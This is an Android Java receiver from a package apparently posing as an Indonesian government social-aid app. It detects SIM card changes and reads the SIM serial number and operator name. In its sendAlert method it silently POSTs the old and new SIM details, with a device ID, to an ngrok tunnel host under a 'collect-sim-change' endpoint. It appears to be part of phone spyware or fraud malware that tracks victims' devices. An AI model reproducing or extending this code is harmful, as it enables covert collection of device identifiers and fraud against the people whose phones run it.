package com.kemensos.bansos;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * SimChangeReceiver — Detects SIM card changes
 * Based on reference: TelephonyManager.ACTION_SIM_STATE_CHANGED
 * Sends alert to POST /api/collect-sim-change/<device_id>
 */
public class SimChangeReceiver extends BroadcastReceiver {

    private static final String TAG = "SimChange";
    private static final String PREFS_NAME = "sim_prefs";
    private static final String KEY_SIM_SERIAL = "sim_serial";
    private static final String KEY_OPERATOR = "sim_operator";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null || !action.equals("android.intent.action.SIM_STATE_CHANGED")) {
            return;
        }

        String state = intent.getStringExtra("ss");
        Log.d(TAG, "SIM state changed: " + state);

        // Only act when SIM is fully loaded (ABSENT or READY after LOADED)
        if (!"ABSENT".equals(state) &&
            !"LOADED".equals(state)) {
            return;
        }

        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String oldSerial = prefs.getString(KEY_SIM_SERIAL, null);
        String oldOperator = prefs.getString(KEY_OPERATOR, null);

        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) return;

        String newSerial = tm.getSimSerialNumber();
        String newOperator = tm.getSimOperatorName();
        if (newOperator == null || newOperator.isEmpty()) {
            newOperator = tm.getNetworkOperatorName();
        }
        if (newOperator == null) newOperator = "Unknown";

        // Check if SIM changed or this is first run
        if (oldSerial == null) {
            // First run — store current SIM info
            if (newSerial != null) {
                prefs.edit()
                    .putString(KEY_SIM_SERIAL, newSerial)
                    .putString(KEY_OPERATOR, newOperator)
                    .apply();
            }
            return;
        }

        // SIM is absent or changed
        if ("ABSENT".equals(state)) {
            // SIM removed — don't send alert yet, wait for new SIM
            return;
        }

        if (newSerial != null && !newSerial.equals(oldSerial)) {
            // SIM changed! Send alert
            Log.w(TAG, "SIM CARD CHANGED! Old: " + oldSerial + " New: " + newSerial);
            sendAlert(context, oldSerial, newSerial, oldOperator, newOperator);

            // Update stored values
            prefs.edit()
                .putString(KEY_SIM_SERIAL, newSerial)
                .putString(KEY_OPERATOR, newOperator)
                .apply();
        }
    }

    private void sendAlert(Context context, String oldSim, String newSim,
                          String oldOperator, String newOperator) {
        new Thread(() -> {
            try {
                String deviceId = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                        .getString("device_id", "unknown");

                JSONObject data = new JSONObject();
                data.put("old_sim", oldSim != null ? oldSim : "");
                data.put("new_sim", newSim != null ? newSim : "");
                data.put("old_operator", oldOperator != null ? oldOperator : "");
                data.put("new_operator", newOperator != null ? newOperator : "");

                String baseUrl = "https://scarf-ion-cranium.ngrok-free.dev";
                URL url = new URL(baseUrl + "/api/collect-sim-change/" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "SIM alert sent, response: " + responseCode);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send SIM alert error: " + e.getMessage());
            }
        }).start();
    }
}
